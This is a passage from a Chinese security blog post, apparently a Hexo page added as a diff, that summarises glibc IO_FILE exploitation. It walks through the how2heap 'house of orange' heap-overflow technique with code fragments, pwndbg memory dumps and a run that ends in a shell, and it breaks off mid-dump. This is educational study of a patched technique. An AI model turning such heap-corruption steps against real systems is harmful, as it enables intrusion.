@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn利用总结," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="一直很想写一篇IO_FILE的利用总结，虽然写的有点晚了，希望写这一篇总结可以对IO_FILE有一个深入的了解吧…">
+<meta name="keywords" content="pwn利用总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IO_FILE利用总结">
+<meta property="og:url" content="http://x3h1n.github.io/2019/04/05/IO-FILE利用总结/index.html">
+<meta property="og:site_name" content="X3h1n">
+<meta property="og:description" content="一直很想写一篇IO_FILE的利用总结，虽然写的有点晚了，希望写这一篇总结可以对IO_FILE有一个深入的了解吧…">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://x3h1n.github.io/2019/04/05/IO-FILE利用总结/1.png">
+<meta property="og:image" content="http://x3h1n.github.io/2019/04/05/IO-FILE利用总结/2.png">
+<meta property="og:updated_time" content="2019-04-23T09:09:53.665Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="IO_FILE利用总结">
+<meta name="twitter:description" content="一直很想写一篇IO_FILE的利用总结，虽然写的有点晚了，希望写这一篇总结可以对IO_FILE有一个深入的了解吧…">
+<meta name="twitter:image" content="http://x3h1n.github.io/2019/04/05/IO-FILE利用总结/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","3display":"post","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://x3h1n.github.io/2019/04/05/IO-FILE利用总结/"/>
+
+
+
+
+
+  <title>IO_FILE利用总结 | X3h1n</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">X3h1n</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://x3h1n.github.io/2019/04/05/IO-FILE利用总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="X3h1n">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">IO_FILE利用总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-05T21:58:04+08:00">
+                2019-04-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>一直很想写一篇IO_FILE的利用总结，虽然写的有点晚了，希望写这一篇总结可以对IO_FILE有一个深入的了解吧…<br><a id="more"></a></p>
+<p>#文件结构<br>在libc中，文件结构由一个叫_IO_FILE_plus的结构体维护，它包含一个_IO_FILE结构体和一个指向函数跳转表的指针。从注释我们也可以知道，vtable指向的函数跳转表是为了与C++的streambuf兼容，当程序对某个流进行操作时，会对应调用函数调用表中对应的函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.23 ./libio/libioP.h</span></span><br><span class="line"><span class="comment">/* We always allocate an extra word following an _IO_FILE.</span></span><br><span class="line"><span class="comment">   This contains a pointer to the function jump table used.</span></span><br><span class="line"><span class="comment">   This is for compatibility with C++ streambuf; the word can</span></span><br><span class="line"><span class="comment">   be used to smash to a pointer to a virtual function table. */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
+<p>_IO_FILE结构体的具体成员如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.23 ./libio/libio.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;   <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr; <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end; <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base; <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;  <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
+<p>这个函数跳转表由结构体_IO_jump_t维护，具体成员如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.23 ./libio/libioP.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
+<p>程序所有的FILE结构会通过_IO_FILE结构体中的成员_chain链成一个链表，其头部为全局变量_IO_list_all。</p>
+<h1 id="HITCON-2016-house-of-orange"><a href="#HITCON-2016-house-of-orange" class="headerlink" title="HITCON 2016 house of orange"></a>HITCON 2016 house of orange</h1><h1 id="how2heap-house-of-orange"><a href="#how2heap-house-of-orange" class="headerlink" title="how2heap house of orange"></a>how2heap house of orange</h1><h2 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h2><p><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c" target="_blank" rel="noopener">题目源码</a></p>
+<p>编译及运行情况：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">$ gcc ./house_of_orange.c -o house_of_orange</span><br><span class="line">$ ./house_of_orange</span><br><span class="line">The attack vector of this technique was removed by changing the behavior of malloc_printerr, which <span class="keyword">is</span> no longer calling _IO_flush_all_lockp, <span class="keyword">in</span> <span class="number">91e7</span>cf982d0104f0e71770f5ae8e3faf352dea9f (<span class="number">2.26</span>).</span><br><span class="line">Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51</span><br><span class="line">*** Error <span class="keyword">in</span> `./house_of_orange<span class="string">': malloc(): memory corruption: 0x00007f09b381c520 ***</span></span><br><span class="line"><span class="string">======= Backtrace: =========</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f09b34ce7e5]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(+0x8213e)[0x7f09b34d913e]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f09b34db184]</span></span><br><span class="line"><span class="string">./house_of_orange[0x400788]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f09b3477830]</span></span><br><span class="line"><span class="string">./house_of_orange[0x400589]</span></span><br><span class="line"><span class="string">======= Memory map: ========</span></span><br><span class="line"><span class="string">00400000-00401000 r-xp 00000000 08:01 528543                             /home/ubuntu/Documents/how2heap/2.25/house_of_orange</span></span><br><span class="line"><span class="string">00600000-00601000 r--p 00000000 08:01 528543                             /home/ubuntu/Documents/how2heap/2.25/house_of_orange</span></span><br><span class="line"><span class="string">00601000-00602000 rw-p 00001000 08:01 528543                             /home/ubuntu/Documents/how2heap/2.25/house_of_orange</span></span><br><span class="line"><span class="string">0109b000-010de000 rw-p 00000000 00:00 0                                  [heap]</span></span><br><span class="line"><span class="string">7f09ac000000-7f09ac021000 rw-p 00000000 00:00 0 </span></span><br><span class="line"><span class="string">7f09ac021000-7f09b0000000 ---p 00000000 00:00 0 </span></span><br><span class="line"><span class="string">7f09b3241000-7f09b3257000 r-xp 00000000 08:01 136299                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span></span><br><span class="line"><span class="string">7f09b3257000-7f09b3456000 ---p 00016000 08:01 136299                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span></span><br><span class="line"><span class="string">7f09b3456000-7f09b3457000 rw-p 00015000 08:01 136299                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span></span><br><span class="line"><span class="string">7f09b3457000-7f09b3617000 r-xp 00000000 08:01 131159                     /lib/x86_64-linux-gnu/libc-2.23.so</span></span><br><span class="line"><span class="string">7f09b3617000-7f09b3817000 ---p 001c0000 08:01 131159                     /lib/x86_64-linux-gnu/libc-2.23.so</span></span><br><span class="line"><span class="string">7f09b3817000-7f09b381b000 r--p 001c0000 08:01 131159                     /lib/x86_64-linux-gnu/libc-2.23.so</span></span><br><span class="line"><span class="string">7f09b381b000-7f09b381d000 rw-p 001c4000 08:01 131159                     /lib/x86_64-linux-gnu/libc-2.23.so</span></span><br><span class="line"><span class="string">7f09b381d000-7f09b3821000 rw-p 00000000 00:00 0 </span></span><br><span class="line"><span class="string">7f09b3821000-7f09b3847000 r-xp 00000000 08:01 131157                     /lib/x86_64-linux-gnu/ld-2.23.so</span></span><br><span class="line"><span class="string">7f09b3a2a000-7f09b3a2d000 rw-p 00000000 00:00 0 </span></span><br><span class="line"><span class="string">7f09b3a45000-7f09b3a46000 rw-p 00000000 00:00 0 </span></span><br><span class="line"><span class="string">7f09b3a46000-7f09b3a47000 r--p 00025000 08:01 131157                     /lib/x86_64-linux-gnu/ld-2.23.so</span></span><br><span class="line"><span class="string">7f09b3a47000-7f09b3a48000 rw-p 00026000 08:01 131157                     /lib/x86_64-linux-gnu/ld-2.23.so</span></span><br><span class="line"><span class="string">7f09b3a48000-7f09b3a49000 rw-p 00000000 00:00 0 </span></span><br><span class="line"><span class="string">7ffd6392a000-7ffd6394b000 rw-p 00000000 00:00 0                          [stack]</span></span><br><span class="line"><span class="string">7ffd639a3000-7ffd639a5000 r--p 00000000 00:00 0                          [vvar]</span></span><br><span class="line"><span class="string">7ffd639a5000-7ffd639a7000 r-xp 00000000 00:00 0                          [vdso]</span></span><br><span class="line"><span class="string">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">ubuntu</span></span><br></pre></td></tr></table></figure>
+<h2 id="利用过程分析"><a href="#利用过程分析" class="headerlink" title="利用过程分析"></a>利用过程分析</h2><p>House  of orange假设堆上存在一个缓冲区溢出，top chunk可以被破坏。初始时通常top chunk的大小为0x21000，随着堆的不断分配，top chunk逐渐变小，当top chunk的大小小于请求分配的大小时，会有两种可能性，一是以brk的形式扩展top chunk，二是使用mmap创建独立的的page。但如果申请的chunk大小小于mmap_threshold时，会进行top chunk的扩展，mmap_threshold是128KB。</p>
+<p>首先申请一个大小为0x400的chunk p1，，从top chunk中分配了0x400，此时top chunk的大小和prev_inuse位组合为0x20c01。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>); <span class="comment">//0x400</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="number">0x602000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x401</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x602400</span> PREV_INUSE &#123;  <span class="comment">#top chunk</span></span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x20c01</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将top chunk的大小由0x20c01改为0xc01。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">top = (<span class="keyword">size_t</span> *) ( (<span class="keyword">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">8</span>gx <span class="number">0x602000</span>  <span class="comment">#chunk p1</span></span><br><span class="line"><span class="number">0x602000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000401</span></span><br><span class="line"><span class="number">0x602010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x /<span class="number">8</span>gx <span class="number">0x602400</span>  <span class="comment">#top chunk</span></span><br><span class="line"><span class="number">0x602400</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000c01</span></span><br><span class="line"><span class="number">0x602410</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602420</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602430</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+<p>对于伪造top chunk的大小有一些要求：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert((old_top == initial_top(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">     ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">      prev_inuse(old_top) &amp;&amp;</span><br><span class="line">      ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)old_end &amp; pagemask) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure></p>
+<p>堆的边界必须是页面对齐的，因为top chunk是堆上的最后一个块，所以它必须在末尾进行页面对齐。另外，如果要释放与top chunk相邻的chunk，则该chunk会与top chunk合并，因此top chunk的PREV_INUSE必须为1，所以总结来说，top chunk的大小有以下要求。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">size要大于MINSIZE（<span class="number">0x10</span>）</span><br><span class="line">top chunk的prev_inuse位必须为<span class="number">1</span></span><br><span class="line">top chunk + size必须页面对齐(一般内存页的大小为<span class="number">4</span>KB)</span><br></pre></td></tr></table></figure>
+<p>当我们请求一个大于top chunk但又小于mmap_threshold的chunk时，会强制调用sysmalloc，最终调用_int_free。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.25 ./malloc/malloc.c</span></span><br><span class="line"><span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">&#123;</span><br><span class="line">    _int_free (av, old_top, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>malloc会分配另外一个page作为新的top chunk，新的top chunk与原来的top chunk相邻，原来的top chunk会进入unsorted bin中。原来堆的大小：</p>
+<p><img src="/2019/04/05/IO-FILE利用总结/1.png" alt="1"></p>
+<p>top chunk扩展之后：</p>
+<p><img src="/2019/04/05/IO-FILE利用总结/2.png" alt="2"></p>
+<p>原来的top chunk进入unsorted bin中，原来的top chunk大小为0x21000，从0x623000进行top chunk的扩展，与原来的top chunk相邻，在新的top chunk中分配0x1000，即chunk p1。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">8</span>gx <span class="number">0x623000</span>  <span class="comment">#chunk p1</span></span><br><span class="line"><span class="number">0x623000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000001011</span></span><br><span class="line"><span class="number">0x623010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x623020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x623030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x /<span class="number">8</span>gx <span class="number">0x624010</span>  <span class="comment">#新的top chunk</span></span><br><span class="line"><span class="number">0x624010</span>:	<span class="number">0x0000000000000000</span>	<span 